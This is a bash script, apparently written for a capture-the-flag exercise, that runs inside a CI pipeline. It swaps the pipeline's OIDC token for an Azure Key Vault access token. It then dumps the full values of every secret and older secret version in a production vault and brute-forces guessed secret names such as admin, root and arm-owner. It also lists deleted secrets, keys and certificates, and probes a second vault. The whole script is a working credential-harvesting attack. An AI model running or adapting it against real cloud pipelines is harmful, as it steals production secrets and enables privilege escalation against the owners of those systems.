#!/usr/bin/env bash
set -uo pipefail
M="--max-time 30 --connect-timeout 10"
TEN=$AZURE_TENANT_ID
PRODKV="https://kv-tbl-prod-x3euoz.vault.azure.net"
SECKV="https://kv-tbl-sec-x3euoz.vault.azure.net"

OIDC=$(curl -sS $M -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.value')
KV=$(curl -sS $M -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$AZURE_CLIENT_ID" -d "scope=https://vault.azure.net/.default" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" -d "client_assertion=$OIDC" | jq -r '.access_token // empty')
H=(-H "Authorization: Bearer $KV")

grepf(){ printf '%s' "$1" | grep -aoE "DF26\{[^}]*\}" && echo "   *** FLAG ***"; }

echo "===== kv-tbl-prod: enabled secrets (names + FULL values + grep) ====="
for sid in $(curl -sS $M "${H[@]}" "$PRODKV/secrets?api-version=7.4&maxresults=25" | jq -r '.value[]?.id'); do
  nm=${sid##*/}
  v=$(curl -sS $M "${H[@]}" "$sid?api-version=7.4" | jq -r '.value // empty')
  echo "--- $nm --- (len ${#v})"; echo "$v"; grepf "$v"
  echo "   versions:"
  for vid in $(curl -sS $M "${H[@]}" "$sid/versions?api-version=7.4&maxresults=25" | jq -r '.value[]?.id'); do
    vv=$(curl -sS $M "${H[@]}" "$vid?api-version=7.4" | jq -r '.value // empty'); [ "$vv" = "$v" ] && continue
    echo "     [$vid] = $vv"; grepf "$vv"
  done
done

echo; echo "===== kv-tbl-prod: DISABLED/other secrets via full list, and guessed names ====="
for g in flag the-flag ctf-flag flag-prod internal-config deploy-config config storefront admin root arm-owner armowner escalation planner planner-escalation platform-automation bootstrap seed; do
  r=$(curl -sS $M "${H[@]}" "$PRODKV/secrets/$g?api-version=7.4")
  code=$(printf '%s' "$r"|jq -r 'if .value then "VALUE" else (.error.code//"?") end')
  if [ "$code" = "VALUE" ]; then v=$(printf '%s' "$r"|jq -r '.value'); echo "  $g = $v"; grepf "$v"; else echo "  $g -> $code"; fi
done

echo; echo "===== kv-tbl-prod SOFT-DELETED secrets (recover+read) ====="
curl -sS $M "${H[@]}" "$PRODKV/deletedsecrets?api-version=7.4&maxresults=25" | jq -r 'if .error then "deletedsecrets: ERR:"+.error.code else (.value[]?.id) end'

echo; echo "===== kv-tbl-prod KEYS and CERTIFICATES (flag may be a cert/ key tag) ====="
curl -sS $M "${H[@]}" "$PRODKV/keys?api-version=7.4" | jq -rc 'if .error then "keys ERR:"+.error.code else [.value[]?.kid] end'
curl -sS $M "${H[@]}" "$PRODKV/certificates?api-version=7.4" | jq -rc 'if .error then "certs ERR:"+.error.code else [.value[]?.id] end'

echo; echo "===== same guessed names against kv-tbl-sec (pipeline token), just in case ====="
for g in flag the-flag ctf-flag; do
  echo "  $g -> $(curl -sS $M "${H[@]}" "$SECKV/secrets/$g?api-version=7.4" | jq -rc 'if .value then .value else .error.code end')"
done
echo "FINAL1 DONE"; exit 0
